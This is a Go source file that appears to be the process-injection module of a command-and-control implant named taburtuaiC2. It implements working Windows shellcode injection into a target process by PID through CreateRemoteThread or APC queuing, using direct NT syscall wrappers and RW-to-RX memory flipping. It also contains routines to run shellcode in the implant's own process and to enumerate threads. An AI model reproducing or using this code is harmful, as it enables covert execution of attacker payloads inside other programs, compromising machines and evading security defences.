//go:build windows

package inject

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"

	winsyscall "github.com/mjopsec/taburtuaiC2/implant/syscall"
)

// THREADENTRY32 mirrors the Win32 THREADENTRY32 struct for thread enumeration.
type THREADENTRY32 struct {
	DwSize             uint32
	CntUsage           uint32
	Th32ThreadID       uint32
	Th32OwnerProcessID uint32
	TpBasePri          int32
	TpDeltaPri         int32
	DwFlags            uint32
}

// InjectShellcode injects shellcode into a remote process.
// method: "crt" (CreateRemoteThread) | "apc" (QueueUserAPC)
func InjectShellcode(targetPID uint32, shellcode []byte, method string) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}
	switch method {
	case "apc":
		return injectAPC(targetPID, shellcode)
	default:
		return injectCRT(targetPID, shellcode)
	}
}

func injectCRT(pid uint32, shellcode []byte) error {
	hProc, err := windows.OpenProcess(winsyscall.ProcessAllAccess, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	addr, err := winsyscall.NtAlloc(hProc, uintptr(len(shellcode)), winsyscall.PageReadWrite)
	if err != nil {
		return err
	}

	if err := winsyscall.NtWrite(hProc, addr, shellcode); err != nil {
		winsyscall.NtFree(hProc, addr)
		return err
	}

	if _, err := winsyscall.NtProtect(hProc, addr, uintptr(len(shellcode)), winsyscall.PageExecRead); err != nil {
		winsyscall.NtFree(hProc, addr)
		return fmt.Errorf("VirtualProtect(RX): %w", err)
	}

	hThread, err := winsyscall.NtCreateThread(hProc, addr)
	if err != nil {
		winsyscall.NtFree(hProc, addr)
		return err
	}
	windows.CloseHandle(hThread)
	return nil
}

func injectAPC(pid uint32, shellcode []byte) error {
	hProc, err := windows.OpenProcess(winsyscall.ProcessAllAccess, false, pid)
	if err != nil {
		return fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProc)

	addr, err := winsyscall.NtAlloc(hProc, uintptr(len(shellcode)), winsyscall.PageReadWrite)
	if err != nil {
		return err
	}

	if err := winsyscall.NtWrite(hProc, addr, shellcode); err != nil {
		winsyscall.NtFree(hProc, addr)
		return err
	}

	if _, err := winsyscall.NtProtect(hProc, addr, uintptr(len(shellcode)), winsyscall.PageExecRead); err != nil {
		winsyscall.NtFree(hProc, addr)
		return fmt.Errorf("VirtualProtect(RX): %w", err)
	}

	tids, err := ProcessThreadIDs(pid)
	if err != nil || len(tids) == 0 {
		return fmt.Errorf("no threads found in PID %d", pid)
	}

	queued := 0
	for _, tid := range tids {
		hThread, _, _ := winsyscall.ProcOpenThread.Call(uintptr(winsyscall.ThreadAllAccess), 0, uintptr(tid))
		if hThread == 0 {
			continue
		}
		winsyscall.ProcQueueUserAPC.Call(addr, hThread, 0)
		windows.CloseHandle(windows.Handle(hThread))
		queued++
	}
	if queued == 0 {
		return fmt.Errorf("failed to queue APC to any thread in PID %d", pid)
	}
	return nil
}

// ExecShellcodeSelf allocates RWX memory in the current process and executes shellcode.
func ExecShellcodeSelf(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	hSelf := windows.CurrentProcess()
	addr, err := winsyscall.NtAlloc(hSelf, uintptr(len(shellcode)), winsyscall.PageReadWrite)
	if err != nil {
		return err
	}

	if err := winsyscall.NtWrite(hSelf, addr, shellcode); err != nil {
		winsyscall.NtFree(hSelf, addr)
		return err
	}

	if _, err := winsyscall.NtProtectSelf(addr, uintptr(len(shellcode)), winsyscall.PageExecRead); err != nil {
		winsyscall.NtFree(hSelf, addr)
		return fmt.Errorf("VirtualProtect(RX): %w", err)
	}

	syscall.SyscallN(addr)
	return nil
}

// ProcessThreadIDs returns all thread IDs belonging to pid.
func ProcessThreadIDs(pid uint32) ([]uint32, error) {
	hSnap, _, e := winsyscall.ProcCreateToolhelp32Snapshot.Call(uintptr(winsyscall.Th32csSnapThread), 0)
	if hSnap == ^uintptr(0) {
		return nil, fmt.Errorf("CreateToolhelp32Snapshot: %v", e)
	}
	defer windows.CloseHandle(windows.Handle(hSnap))

	var entry THREADENTRY32
	entry.DwSize = uint32(unsafe.Sizeof(entry))

	r, _, _ := winsyscall.ProcThread32First.Call(hSnap, uintptr(unsafe.Pointer(&entry)))
	if r == 0 {
		return nil, nil
	}

	var ids []uint32
	for {
		if entry.Th32OwnerProcessID == pid {
			ids = append(ids, entry.Th32ThreadID)
		}
		entry.DwSize = uint32(unsafe.Sizeof(entry))
		r, _, _ = winsyscall.ProcThread32Next.Call(hSnap, uintptr(unsafe.Pointer(&entry)))
		if r == 0 {
			break
		}
	}
	return ids, nil
}
